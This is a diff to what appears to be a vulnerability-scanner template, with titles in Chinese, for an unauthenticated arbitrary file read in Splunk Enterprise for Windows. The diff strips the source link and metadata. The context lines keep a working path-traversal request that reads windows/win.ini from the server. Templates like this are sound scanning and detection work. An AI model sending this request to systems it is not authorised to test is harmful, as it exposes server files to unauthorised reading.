@@ -3,12 +3,8 @@ info:
   name: Splunk Enterprise for Windows 未授权任意文件读取漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/qocrg8wgzyhmgsui'
+  description: ''
   tags: lfi,unauth,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: qocrg8wgzyhmgsui
-    fofa: app="splunk-Enterprise"
 http:
 - raw:
   - 'GET /en-US/modules/messaging/C:../C:../C:../C:../C:../C:../C:../C:../C:../C:../windows/win.ini HTTP/1.1
